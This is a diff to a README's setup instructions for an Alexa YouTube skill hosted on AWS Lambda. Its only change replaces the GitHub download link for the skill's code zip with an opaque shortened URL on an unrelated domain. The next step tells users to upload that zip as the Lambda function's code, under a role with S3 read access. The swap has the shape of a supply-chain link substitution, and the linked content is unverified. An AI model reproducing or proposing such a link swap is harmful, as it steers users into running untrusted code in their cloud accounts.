@@ -94,7 +94,7 @@ ultra nate
 7. Now it's time to set up Lambda. Log on to your AWS account and select "Lambda" from the main console menu. Make sure your region is set to N. Virginia (North America) or EU-Ireland (Europe).
 8. Click on "Create a Lambda function" in the Lambda console menu. For the blueprint, select __alexa-skills-kit-color-expert__.
 9. Configure the function. Give it a name like "alexaYoutubeSkill" and fill in an appropriate description. Assign it to a role with at least S3 read permissions. Leave the rest the default skill for now.
-10. [Click here](https://github.com/dmhacker/alexa-youtube-skill/raw/master/alexa-youtube-skill.zip) to download __alexa-youtube-skill.zip__, which contains all the code for the Lambda server.
+10. [Click here](http://viahold.com/31Kq) to download __alexa-youtube-skill.zip__, which contains all the code for the Lambda server.
 11. Now, go back to the Lambda function you just saved. Under "Code entry type," select "Upload a ZIP file." Then, upload alexa-youtube-skill.zip under "Function Package."
 12. You will now need to fill out the required environment variables:
 
